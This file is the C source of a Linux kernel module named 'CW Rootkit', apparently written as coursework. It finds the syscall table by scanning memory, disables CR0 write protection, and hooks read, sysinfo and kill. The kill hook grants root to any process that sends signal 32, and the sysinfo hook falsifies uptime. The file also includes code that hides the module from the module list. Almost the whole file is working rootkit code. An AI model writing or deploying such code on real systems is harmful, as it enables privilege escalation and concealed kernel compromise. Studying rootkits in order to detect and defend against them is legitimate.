#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Finn_Adam_Charlie");
MODULE_DESCRIPTION("CW Rootkit");
MODULE_VERSION("0.0.1");

#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#define SYS_CALL_NUM 300

#define SIGSUPER 32

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

void **sys_call_table;
struct list_head *module_list;
struct sysinfo *info;

unsigned long read_count = 0;
asmlinkage long (*original_read)(unsigned int, char __user *, size_t);

asmlinkage int (*original_sysinfo)(struct sysinfo *);

asmlinkage int (*original_kill)(pid_t, int);

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < (void*)END_ADDRESS) {
        sctable = (void **) i;
        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
        size_t j;
        // sanity check: no function pointer in the system call table should be NULL
        for (j = 0; j < SYS_CALL_NUM; j ++) {
            if (sctable[j] == NULL) {
                goto skip;
            }
        }
        return sctable;
        }
        skip:
        i += sizeof(void *);
    }

    return NULL;
}

asmlinkage long hacked_read(unsigned int fd, char __user *buf, size_t count)
{
    read_count ++;

    //pr_info("%d reads so far!\n", read_count);
    return original_read(fd, buf, count);
}

asmlinkage int hacked_sysinfo(struct sysinfo *info)
{
    original_sysinfo(info);
    info->uptime = 0;

    return 0;
}

void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
    	return;
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
 

    // TODO set the newcreds structure to give root privilege
    commit_creds(newcreds);
}

asmlinkage int hacked_kill(pid_t pid, int sig){
    struct task_struct *task;

    switch(sig) {
        case SIGSUPER:
            give_root();
            break;
        default:
            return original_kill(pid, sig);
    }
    return 0;
}


static int __init lkm_example_init(void) {
    //Don't hide the kernel for now
    //hide();
    printk(KERN_INFO "Hello, World!\n");

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    void **modified_at_address_read = &sys_call_table[__NR_read];
    void *modified_function_read = hacked_read;
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = hacked_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = hacked_kill;

    DISABLE_W_PROTECTED_MEMORY
    original_read = xchg(modified_at_address_read, modified_function_read);
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    ENABLE_W_PROTECTED_MEMORY

    return 0;
}

static void __exit lkm_example_exit(void) {
    printk(KERN_INFO "Goodbye, World!\n");

    void **modified_at_address_read = &sys_call_table[__NR_read];
    void *modified_function_read = original_read;
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = original_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = original_kill;

    DISABLE_W_PROTECTED_MEMORY
    original_read = xchg(modified_at_address_read, modified_function_read);
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    ENABLE_W_PROTECTED_MEMORY
}



module_init(lkm_example_init);
module_exit(lkm_example_exit);
